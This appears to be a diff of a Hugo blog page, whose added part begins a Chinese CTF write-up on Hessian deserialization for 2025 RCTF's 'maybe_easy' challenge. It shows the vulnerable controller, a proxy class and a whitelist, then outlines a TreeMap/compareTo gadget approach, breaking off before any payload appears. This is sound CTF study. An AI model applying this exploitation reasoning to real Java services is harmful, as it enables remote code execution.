-    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
-<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
-<div id="waline" class="waline-container"></div>
-<style>
-    .waline-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-        --waline-font-size: var(--article-font-size);
-    }
-    .waline-container .wl-count {
-        color: var(--card-text-color-main);
-    }
-</style><script>
-    
-    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2025 - 
-        
-        2026 无敌可爱美咕噜
-    </section>
-    
-    <section class="powerby">
-        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
-        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
-    </section>
-</footer>
-
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-<style>
-  body {
-    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
-    background-size: cover;
-    background-attachment: fixed;
-  }
-</style>
-
- 
-<style>
-  @font-face {
-    font-family: 'ss';
-    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
-  }
-
-  :root {
-    --base-font-family: 'ss';
-    --code-font-family: 'ss';
-  }
-</style>
-<style>
-    #TableOfContents > ul, ol {
-        ul, ol {
-            display: none;
-        }
-        .open {
-            display: block;
-        }
-    }
-</style>
-
-<script>
-    function initTocHide() {
-        
-        let toc = document.querySelector(".widget--toc");
-        if (!toc) {
-            return;
-        }
-        
-        window.addEventListener('scroll', function() {
-            
-            let openUl = document.querySelectorAll(".open");
-            if (openUl.length > 0) {
-              openUl.forEach((ul) => {
-                ul.classList.remove("open")
-              })
-            }
-            
-            let currentLi = document.querySelector(".active-class");
-            if (!currentLi) {
-                return
-            }
-            
-            if (currentLi.children.length > 1) {
-                currentLi.children[1].classList.add("open")
-            }
-            
-            let ul = currentLi.parentElement;
-            do {
-                ul.classList.add("open");
-                ul = ul.parentElement.parentElement
-            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
-        });
-    }
-    initTocHide()
-</script>
-
-<style>
-    #backTopBtn {
-        display: none;
-        position: fixed;
-        bottom: 30px;
-        z-index: 99;
-        cursor: pointer;
-        width: 30px;
-        height: 30px;
-        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
-    }
-</style>
-
-<script>
-    
-
-    function initScrollTop() {
-        let rightSideBar = document.querySelector(".right-sidebar");
-        if (!rightSideBar) {
-            return;
-        }
-        
-        let btn = document.createElement("div");
-        btn.id = "backTopBtn";
-        btn.onclick = backToTop
-        rightSideBar.appendChild(btn)
-        
-        window.onscroll = function() {
-            
-            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
-                btn.style.display = "block";
-            } else {
-                btn.style.display = "none";
-            }
-        };
-    }
-
-    
-
-    function backToTop(){
-        window.scrollTo({ top: 0, behavior: "smooth" })
-    }
-
-    initScrollTop();
-</script>
-
-
-<script>   
-  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
-  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
-  const config = {
-    
-    path: {
-      homePath: "/",
-      modelPath: cdnPath + "/Resources/",
-      cssPath: cssPath,
-      tipsJsonPath: cdnPath + "/waifu-tips.json",
-      tipsJsPath: cdnPath + "/waifu-tips.js",
-      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
-      live2dSdkPath: cdnPath + "/live2d-sdk.js"
-    },
-    
-    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
-    
-    drag: {
-      enable: true,
-      direction: ["x", "y"]
-    },
-    
-    switchType: "order"
-  }
-
-  
-  if (screen.width >= 768) {
-    Promise.all([
-      loadExternalResource(config.path.cssPath, "css"),
-      loadExternalResource(config.path.live2dCorePath, "js"),
-      loadExternalResource(config.path.live2dSdkPath, "js"),
-      loadExternalResource(config.path.tipsJsPath, "js")
-    ]).then(() => {
-      initWidget({
-        waifuPath: config.path.tipsJsonPath,
-        cdnPath: config.path.modelPath,
-        tools: config.tools,
-        dragEnable: config.drag.enable,
-        dragDirection: config.drag.direction,
-        switchType: config.switchType
-      });
-    });
-  }
-
-  
-  function loadExternalResource(url, type) {
-    return new Promise((resolve, reject) => {
-      let tag;
-      if (type === "css") {
-        tag = document.createElement("link");
-        tag.rel = "stylesheet";
-        tag.href = url;
-      }
-      else if (type === "js") {
-        tag = document.createElement("script");
-        tag.src = url;
-      }
-      if (tag) {
-        tag.onload = () => resolve(url);
-        tag.onerror = () => reject(url);
-        document.head.appendChild(tag);
-      }
-    });
-  }
-</script>
-
-    </body>
-</html>
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='2025RCTFwp maybe_easy jar包下下来先看依赖，hessian4.0.66\n入口在controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.rctf.server.controller; import com.rctf.server.tool.HessianFactory; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class RCTFController { @RequestMapping({"/hello"}) public String hello(@RequestParam(name = "data",required = false) String data) throws Exception { Object obj = HessianFactory.deserialize(data); return "hello"; } } hello路由传data反序列化\n'><title>2025RCTFwp</title><link rel=canonical href=https://0d000721999.github.io/p/2025rctfwp/><link rel=stylesheet href=/scss/style.min.e8f9fb65172830b7456cc8f040d4bbb0a7691d6eaa1e581f17d264a13d1d48d4.css><meta property='og:title' content="2025RCTFwp"><meta property='og:description' content='2025RCTFwp maybe_easy jar包下下来先看依赖，hessian4.0.66\n入口在controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.rctf.server.controller; import com.rctf.server.tool.HessianFactory; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class RCTFController { @RequestMapping({"/hello"}) public String hello(@RequestParam(name = "data",required = false) String data) throws Exception { Object obj = HessianFactory.deserialize(data); return "hello"; } } hello路由传data反序列化\n'><meta property='og:url' content='https://0d000721999.github.io/p/2025rctfwp/'><meta property='og:site_name' content='美咕噜的小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:tag' content='java'><meta property='article:published_time' content='2025-11-19T00:00:00+00:00'><meta property='article:modified_time' content='2025-11-19T00:00:00+00:00'><meta property='og:image' content='https://0d000721999.github.io/p/2025rctfwp/1_hu_54c4b783700870dd.webp'><meta name=twitter:title content="2025RCTFwp"><meta name=twitter:description content='2025RCTFwp maybe_easy jar包下下来先看依赖，hessian4.0.66\n入口在controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.rctf.server.controller; import com.rctf.server.tool.HessianFactory; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class RCTFController { @RequestMapping({"/hello"}) public String hello(@RequestParam(name = "data",required = false) String data) throws Exception { Object obj = HessianFactory.deserialize(data); return "hello"; } } hello路由传data反序列化\n'><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://0d000721999.github.io/p/2025rctfwp/1_hu_54c4b783700870dd.webp'><link rel="shortcut icon" href=/favicon.ico><link rel=preload href=/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2 as=font type=font/woff2 crossorigin><style>@font-face{font-family:blogmono;src:url(/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2)format("woff2");font-display:swap;font-style:normal;font-weight:400}body{background-color:#f3eeee;background-image:linear-gradient(rgba(255,255,255,.16),rgba(255,255,255,.16)),url(/background/1_hu_5012b4e0f83d2384.c8c1acd7eaca2e2d02130c7c020ff283d01dbcc672cf5f750be3a8bdb2bb246e.webp);background-repeat:no-repeat;background-position:50% 0;background-size:cover;background-attachment:fixed}@media(max-width:767px){body{background-image:linear-gradient(rgba(255,255,255,.24),rgba(255,255,255,.24)),url(/background/1_hu_de1ff494d38eb06b.adf00830bddcc1b219db2ff10dd9314f66e7f5e8dcbfce28404699e20b44b9fb.webp);background-attachment:scroll}}@media(prefers-reduced-motion:reduce){body{background-attachment:scroll}}</style></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_cc7d4f5d18fa2884.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>😋</span></figure><div class=site-meta><h1 class=site-name><a href=/>美咕噜的小站</a></h1><h2 class=site-description>Ciallo～(∠・ω&lt; )⌒★</h2></div></header><ol class=menu-social><li><a href=https://buuoj.cn/users/175721 target=_blank title=BUUOJ rel=me><svg class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M7 20V4h6a4 4 0 010 8 4 4 0 010 8H7"/><line x1="7" y1="12" x2="13" y2="12"/></svg></a></li><li><a href=https://github.com/0d000721999 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span></a></li><li><a href=/friends/><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+<span>友链</span></a></li><li><a href=/%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>链接</span></a></li><li class=menu-bottom-section><ol class=menu></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/2025rctfwp/><img src=/p/2025rctfwp/1_hu_bb6f56d45f71973f.webp srcset="/p/2025rctfwp/1_hu_bb6f56d45f71973f.webp 800w, /p/2025rctfwp/1_hu_54c4b783700870dd.webp 1600w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" width=800 height=450 loading=eager decoding=async fetchpriority=high alt=文章封面：2025RCTFwp></a></div><div class=article-details><header class=article-category><a href=/categories/wp/ style=background-color:#2a9d8f;color:#fff>Wp</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/2025rctfwp/>2025RCTFwp</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2025-11-19</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 4 分钟</time></div></footer></div></header><section class=article-content><h1 id=2025rctfwp>2025RCTFwp</h1><h2 id=maybe_easy>maybe_easy</h2><p>jar包下下来先看依赖，hessian4.0.66</p><p>入口在controller</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.rctf.server.controller</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.rctf.server.tool.HessianFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.stereotype.Controller</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RequestMapping</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RequestParam</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Controller</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>RCTFController</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@RequestMapping</span><span class=p>({</span><span class=s>&#34;/hello&#34;</span><span class=p>})</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>hello</span><span class=p>(</span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;data&#34;</span><span class=p>,</span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>data</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>HessianFactory</span><span class=p>.</span><span class=na>deserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=s>&#34;hello&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>hello路由传data反序列化</p><p>Maybe类里面的compareto方法想到打treeMap，而且还会调用InvocationHandler</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.rctf.server.tool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.Serializable</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Method</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Proxy</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Maybe</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Proxy</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>Comparable</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>Serializable</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Maybe</span><span class=p>(</span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>h</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=n>h</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>compareTo</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Comparable</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;compareTo&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>h</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>o</span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>Integer</span><span class=p>)</span><span class=n>result</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Throwable</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>然后看hessian工厂类，定义了hessian的序列化和反序列化函数，设置白名单</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;com.rctf.server.tool.&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;java.util.&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;org.apache.commons.logging.&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;org.springframework.jndi.&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>搜索hessian反序列化文章：<a class=link href=https://su18.org/post/hessian/#groovy target=_blank rel=noopener>Hessian 反序列化知一二 | 素十八</a></p><p>直接找compareto的利用</p><p><img src=/p/2025rctfwp/image-20251118193856691_hu_6a6df831716c5323.webp width=1024 height=563 srcset="/p/2025rctfwp/image-20251118193856691_hu_373dc715d1e894df.webp 480w, /p/2025rctfwp/image-20251118193856691_hu_6a6df831716c5323.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118193856691_hu_80bb4e0b7dc3c1e8.webp data-full-width=1218 data-full-height=670 loading=lazy decoding=async alt=image-20251118193856691 class=gallery-image data-flex-grow=181 data-flex-basis=436px></p><p><img src=/p/2025rctfwp/image-20251118194037530_hu_f2954e6c4301e91d.webp width=1024 height=697 srcset="/p/2025rctfwp/image-20251118194037530_hu_61e8d100ab02e09a.webp 480w, /p/2025rctfwp/image-20251118194037530_hu_f2954e6c4301e91d.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118194037530_hu_c78a1700f4501116.webp data-full-width=1197 data-full-height=815 loading=lazy decoding=async alt=image-20251118194037530 class=gallery-image data-flex-grow=146 